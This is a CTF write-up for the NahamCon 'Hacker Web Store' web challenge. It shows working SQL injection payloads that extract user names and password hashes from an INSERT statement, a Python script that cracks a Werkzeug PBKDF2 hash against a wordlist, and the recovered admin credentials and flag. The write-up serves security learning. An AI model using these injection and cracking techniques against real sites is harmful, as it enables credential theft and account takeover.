
# Challenge Name: Hacker Web Store


![date](https://img.shields.io/badge/date-24.05.2024-brightgreen.svg)  
![solved in time of CTF](https://img.shields.io/badge/solved-in%20time%20of%20CTF-brightgreen.svg)   
![category](https://img.shields.io/badge/category-WEB-blueviolet.svg)   
![value](https://img.shields.io/badge/value-183-blue.svg)  

## Description

Author: @Jstith  
  
Welcome to the hacker web store! Feel free to look around at our wonderful products, or create your own to sell.  
  
_This challenge may require a local password list, which we have provided below. **Reminder, bruteforcing logins is not necessary and [against the rules.](https://ctf.nahamcon.com/rules)**_**  
  
**Attachments:**  [password_list.txt](https://ctf.nahamcon.com/files/0b0df3700fc27beb86dfe2b6d8b077a7/password_list.txt?token=eyJ1c2VyX2lkIjozOTA1LCJ0ZWFtX2lkIjoxODczLCJmaWxlX2lkIjo5M30.ZlJYNQ.2HbqOXfKPZjnZbsNoX0nazWNy88)

## Detailed solution

http://challenge.nahamcon.com:32399/

We have an app with a login page and the option to create posts.

![](https://github.com/BaadMaro/CTF/assets/72421091/d6dd28c2-192f-49d3-b123-5997788780be)

![](https://github.com/BaadMaro/CTF/assets/72421091/46b94709-e819-473b-ab09-a58b5419f0b3)

![](https://github.com/BaadMaro/CTF/assets/72421091/fd8c75a1-6418-4bc1-a5b0-fb6db3fb85d7)

While testing post creation, I detected a SQL injection while sending `'`

![Pasted image 20240525223502](https://github.com/BaadMaro/CTF/assets/72421091/a8089dfa-80b5-4fc2-9b75-167f188a951d)

The values used in post creation have `'` which block using dynamic data.

We can close the first post value and add next to it a second post with dynamic data like this for the description

```
post 1') , ('Product2', '15.99', 'Description2
```

I started checking for columns inside users table, and I was able to detect name and password using `SELECT X FROM users`

```
1') , ('Product2', (SELECT password FROM users), 'Description3
```

We have multiple users so we need to use LIMIT and OFFSET to get all users names and passwords

```
1') , ('Product2', (SELECT name FROM users LIMIT 1 OFFSET 0), 'Description3
```

```
Joram
```

Repeating the same logic for multiple OFFSET (we have 3 users), we were able to get the users 

```
Joram

James

website_admin_account
```

```
pbkdf2:sha256:600000$m28HtZYwJYMjkgJ5$2d481c9f3fe597590e4c4192f762288bf317e834030ae1e069059015fb336c34
pbkdf2:sha256:600000$GnEu1p62RUvMeuzN$262ba711033eb05835efc5a8de02f414e180b5ce0a426659d9b6f9f33bc5ec2b
pbkdf2:sha256:600000$MSok34zBufo9d1tc$b2adfafaeed459f903401ec1656f9da36f4b4c08a50427ec7841570513bf8e57
```

As mentioned in the challenge description, we have a custom password list to crack the hashes

Doing some research, I found that the hash format is used by Python Werkzeug `generate_password_hash`

We need to make a custom function and use the same hash type, iterations, and salt to generate hashes from passwords list and compare them to our hashes.

Here is the example for the `website_admin_account` hash

```python
from werkzeug.security import _hash_internal
import sys

def generate_password_hash(password, method="pbkdf2:sha256:600000"):
    """Hash a password with the given method and salt with a string of
    the given length. The format of the string returned includes the method
    that was used so that :func:`check_password_hash` can check the hash.

    The format for the hashed string looks like this::

        method$salt$hash

    This method can **not** generate unsalted passwords but it is possible
    to set param method='plain' in order to enforce plaintext passwords.
    If a salt is used, hmac is used internally to salt the password.

    If PBKDF2 is wanted it can be enabled by setting the method to
    ``pbkdf2:method:iterations`` where iterations is optional::

        pbkdf2:sha256:80000$salt$hash
        pbkdf2:sha256$salt$hash

    :param password: the password to hash.
    :param method: the hash method to use (one that hashlib supports). Can
                   optionally be in the format ``pbkdf2:<method>[:iterations]``
                   to enable PBKDF2.
    :param salt_length: the length of the salt in letters.
    """
    salt = "MSok34zBufo9d1tc"
    h, actual_method = _hash_internal(method, salt, password)
    return "%s$%s$%s" % (actual_method, salt, h)

f = open("pass.txt", "r")
o = open("crack-admin.txt", "w")

for x in f:
   hash = generate_password_hash(x.strip(),method='pbkdf2:sha256:600000')
   a = f"{x.strip()} {hash}"
   o.write(a)
   print(x.strip())
   if hash == "pbkdf2:sha256:600000$MSok34zBufo9d1tc$b2adfafaeed459f903401ec1656f9da36f4b4c08a50427ec7841570513bf8e57":
       print(f"{x.strip()} found password")
       sys.exit()
o.close()

```

```
ntadmin1234 found password
```

We got our match with `ntadmin1234`

We can login now with  `website_admin_account:ntadmin1234` and get our flag

## Flag

```
flag{87257f24fd71ea9ed8aa62837e768ec0}
```

